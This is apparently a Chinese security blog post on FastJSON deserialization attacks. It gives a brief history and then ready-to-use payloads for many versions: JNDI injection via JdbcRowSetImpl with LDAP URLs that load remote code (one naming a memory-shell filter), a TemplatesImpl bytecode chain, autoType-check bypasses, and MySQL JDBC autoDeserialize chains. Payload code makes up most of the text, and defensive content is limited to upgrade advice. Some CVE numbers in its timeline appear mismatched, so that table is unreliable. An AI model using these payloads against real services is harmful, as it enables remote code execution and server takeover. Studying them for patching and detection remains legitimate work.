---
title: fastjson攻防
date: 2026-03-17 12:50:46
updated: 2026-06-30 03:59:25
tags:
  - Web
  - java
  - 反序列化
---
1.  FastJSON 简介FastJSON 是阿里巴巴开源的一个 Java JSON 处理库，性能极高，曾被广泛用于各种 Java Web 项目中。

官方 GitHub：[https://github.com/alibaba/fastjson（2016](https://github.com/alibaba/fastjson（2016) 年后进入社区维护阶段，2022 年后已不再推荐使用）主流版本分支：

-   1.x 系列（1.2.83 及以前最常用）

-   2.x 系列（重构版，官方宣称修复了大部分历史漏洞）

重要提醒：截至 2025 年，FastJSON 1.x 系列已彻底停止维护，存在大量高危反序列化漏洞，强烈建议全部升级到安全的替代方案（如 Jackson、Gson 或 fastjson2）。

---

2.  反序列化漏洞原理FastJSON 在解析 JSON 时支持以下几种特殊功能，导致攻击者可控制反序列化过程：

| 功能特性 | 触发方式 | 危险等级 |
| --- | --- | --- |
| @type 指定类 | {"@type":"com.xxx.Class", ...} | ★★★★★ |
| $ref 引用 | {"$ref":"$.xxx"} | ★★★★ |
| TypeUtils.castToXXX | 通过 setter 调用静态方法 | ★★★★ |
| MiscCodec | 某些特殊类型解析 | ★★★ |

核心问题：FastJSON 在 parseObject 时，如果开启了 SupportNonPublicField、ASM 加速等功能，会直接根据 @type 实例化任意类，并调用其 setter 方法或自动识别 autotype 白名单，从而触发恶意类的 getter/setter 或静态代码块。

---

3.  经典历史漏洞时间线

| 日期 | 版本范围 | CVE 编号 | 最高影响 | 备注 |
| --- | --- | --- | --- | --- |
| 2017-03 | ≤1.2.24 | - | RCE | 首次公开利用 |
| 2019-01 | ≤1.2.47 | CVE-2019-12384 | RCE | JDBC RowSetImpl JNDI |
| 2020-05 | ≤1.2.68 | CVE-2020-11688 | RCE | 绕过黑名单 |
| 2021-09 | ≤1.2.80 | CVE-2021-40865 | RCE | 多条绕过 |
| 2022-03 | ≤1.2.83 | 高危漏洞（无正式 CVE） | RCE | 最后一次大范围爆发的版本 |

---

4.  常见利用链（Gadgets）4.1 JDBC RowSetImpl JNDI 注入（最经典）

## **利用版本<1.2.24**

  

```json
{
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://0.0.0.0:1389/Deserialization/FastJson1/mytomcatmemfiltershell",
    "autoCommit": true
}
```

4.2 TemplatesImpl 代码执行（无需 JNDI）

条件苛刻，需要调用parseObject()方法时，加入Feature.SupportNonPublicField参数。

```json
{
    "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
    "bytecodes": {
        "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader",
        "val$class": ["$$BCEL$$xxx恶意字节码xxx"]
    },
    "_name": "pwned",
    "outputProperties": {}
}
```

## **利用版本<1.2.47**

poc：如下

利用java.lang.Class缓存恶意类绕过checkAutoType检测

```plain
{
    "aaa": {
        "@type": "java.lang.Class",
        "val": "com.sun.rowset.JdbcRowSetImpl"
    },
    "bbb": {
        "@type": "com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName": "ldap://127.0.0.1:1234/Exploit",
        "autoCommit": true
    }
}
```

  

漏洞隐患，不需要开启`AutoTypeSupport`直接进行`反序列化`操作  
利用条件如下：

-   小于 1.2.48 版本的通杀，`AutoType`为关闭状态也可以。

-   loadClass中默认cache设置为`true`

## **利用版本<1.2.68**

```plain
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class fastjson68 {
    public static void main(String[] args) {
        String exp="{"@type":"java.lang.AutoCloseable","@type":"org.example.VulAutoCloseable","cmd":"calc"}";
        JSON.parse(exp);
    }
}
```

打mysqljdbc链子

Mysql connector 5.1.11-5.1.48

```plain
public static void main(String[] args) {
        String exp="{\"name\": {\"@type\": \"java.lang.AutoCloseable\", \"@type\": \"com.mysql.jdbc.JDBC4Connection\", \"hostToConnectTo\": \"localhost\", \"portToConnectTo\": 53329, \"info\": { \"user\": \"deser_CC31_calc\", \"password\": \"pass\", \"statementInterceptors\": \"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\", \"autoDeserialize\": \"true\", \"NUM_HOSTS\": \"1\" }}";
        JSON.parse(exp);
    }

-------------------------------------------------------------------
{"x":{"@type":"java.lang.AutoCloseable","@type":"com.mysql.jdbc.JDBC4Connection","hostToConnectTo":"127.0.0.1","portToConnectTo":3306,"info":{"user":"CommonsCollections5","password":"ubuntu","useSSL":"false","statementInterceptors":"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor","autoDeserialize":"true"},"databaseToConnectTo":"mysql","url":""}}
```

  

Mysql connector 6.0.2 or 6.0.3

```plain
    public static void main(String[] args) {
        String exp="{\"name\": {\"@type\": \"java.lang.AutoCloseable\", \"@type\": \"com.mysql.jdbc.JDBC4Connection\", \"hostToConnectTo\": \"localhost\", \"portToConnectTo\": 62037, \"info\": { \"user\": \"deser_CUSTOM\", \"password\": \"pass\", \"statementInterceptors\": \"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\", \"autoDeserialize\": \"true\", \"NUM_HOSTS\": \"1\" }}";
        String aa="{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection\",\"proxy\": {\"connectionString\":{\"url\":\"jdbc:mysql://localhost:62037/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=deser_CUSTOM\"}}}";
        JSON.parse(aa);
    }
```

  

mysql-8.0.19

```plain
 public static void main(String[] args) {
        String mysql5="{\"name\": {\"@type\": \"java.lang.AutoCloseable\", \"@type\": \"com.mysql.jdbc.JDBC4Connection\", \"hostToConnectTo\": \"localhost\", \"portToConnectTo\": 62037, \"info\": { \"user\": \"deser_CUSTOM\", \"password\": \"pass\", \"statementInterceptors\": \"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\", \"autoDeserialize\": \"true\", \"NUM_HOSTS\": \"1\" }}";
        String mysql6="{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection\",\"proxy\": {\"connectionString\":{\"url\":\"jdbc:mysql://localhost:62037/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=deser_CUSTOM&useSSL=false\"}}}";
        String mysql8="\n" +
                "{\n" +
                "       \"@type\":\"java.lang.AutoCloseable\",\n" +
                "       \"@type\":\"com.mysql.cj.jdbc.ha.ReplicationMySQLConnection\",\n" +
                "       \"proxy\": {\n" +
                "              \"@type\":\"com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy\",\n" +
                "              \"connectionUrl\":{\n" +
                "                     \"@type\":\"com.mysql.cj.conf.url.ReplicationConnectionUrl\",\n" +
                "                     \"masters\":[{\n" +
                "                            \"host\":\"\"\n" +
                "                     }],\n" +
                "                     \"slaves\":[],\n" +
                "                     \"properties\":{\n" +
                "                            \"host\":\"127.0.0.1\",\n" +
                "                            \"user\":\"deser_CUSTOM\",\n" +
                "                            \"dbname\":\"dbname\",\n" +
                "                            \"password\":\"pass\",\n" +
                "                            \"queryInterceptors\":\"com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\",\n" +
                "                            \"autoDeserialize\":\"true\"\n" +
                "                     }\n" +
                "              }\n" +
                "       }\n" +
                "}";
        JSON.parse(mysql8);
    }
```